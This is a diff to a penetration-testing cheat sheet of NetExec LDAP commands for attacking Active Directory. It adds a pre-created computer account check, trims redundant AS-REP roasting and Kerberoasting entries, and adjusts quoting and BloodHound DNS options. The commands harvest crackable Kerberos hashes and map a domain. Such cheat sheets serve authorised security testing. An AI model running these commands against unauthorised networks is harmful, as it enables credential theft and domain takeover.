@@ -1040,6 +1040,14 @@ Extract user description fields from AD.
 nxc ldap <ip> -u <user> -p '<password>' -M get-desc-users
 ```
 
+## nxc - pre2k Identifying Pre-Created Computer Accounts
+Identifying Pre-Created Computer Accounts
+
+#platform/windows #target/remote
+```bash
+nxc ldap <ip> -u <user> -p '<password>' -M pre2k
+```
+
 ### Group Enumeration
 
 ## nxc - enumerate all LDAP groups
@@ -1055,7 +1063,7 @@ List members of a specific AD group.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '<password>' --groups "<group_name>"
+nxc ldap <ip> -u <user> -p '<password>' --groups '<group_name>'
 ```
 
 ### Kerberos Attacks
@@ -1076,36 +1084,12 @@ Kerberoast using AS-REP roastable accounts.
 nxc ldap <ip> -u <user> -p '<password>' --no-preauth-targets <userfile> --kerberoasting <output_file>
 ```
 
-## nxc - ASREPRoast without authentication
-AS-REP roast without valid credentials.
-
-#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
-```
-
-## nxc - ASREPRoast with user list
-Test multiple users for AS-REP roasting.
-
-#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
-```bash
-nxc ldap <ip> -u <userfile> -p '<password>' --asreproast <output_file>
-```
-
 ## nxc - ASREPRoast with authentication
 Extract AS-REP hashes with valid credentials.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
 ```bash
 nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
-```
-
-## nxc - ASREPRoast with kdcHost
-AS-REP roast with explicit KDC server.
-
-#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <domain>
 ```
 
 ### Domain Information
@@ -1171,7 +1155,7 @@ Query AD using custom LDAP filter.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '<password>' --query "(adminCount=1)" "sAMAccountName"
+nxc ldap <ip> -u <user> -p '<password>' --query '(adminCount=1)' 'sAMAccountName'
 ```
 
 ## nxc - check LDAP signing
@@ -1225,7 +1209,7 @@ Run custom LDAP query returning all attributes.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '<password>' --query "<ldap_filter>" ""
+nxc ldap <ip> -u <user> -p '<password>' --query '<ldap_filter>' ''
 ```
 
 ## nxc - custom LDAP query specific attributes
@@ -1233,7 +1217,7 @@ Run custom LDAP query for specific attributes.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '<password>' --query "<ldap_filter>" "<attributes>"
+nxc ldap <ip> -u <user> -p '<password>' --query '<ldap_filter>' '<attributes>'
 ```
 
 ### BloodHound
@@ -1243,7 +1227,7 @@ Run BloodHound data collector (all methods).
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection All
+nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection All --dns-server <dns_ip>
 ```
 
 ## nxc - run BloodHound with specific methods
@@ -1251,7 +1235,7 @@ Run BloodHound collector with selected methods.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection <methods>
+nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection <methods> --dns-server <dns_ip>
 ```
 
 ### ADCS Exploitation
@@ -2315,14 +2299,6 @@ AS-REP roast without valid credentials.
 #platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
 nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <dc_ip>
-```
-
-## nxc - Kerberoast with kdcHost
-Kerberoast specifying KDC hostname.
-
-#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
-```bash
-nxc ldap <ip> -u <user> -p '<password>' --kerberoasting <output_file> --kdcHost <dc_ip>
 ```
 
 ## nxc - enumerate unconstrained delegation
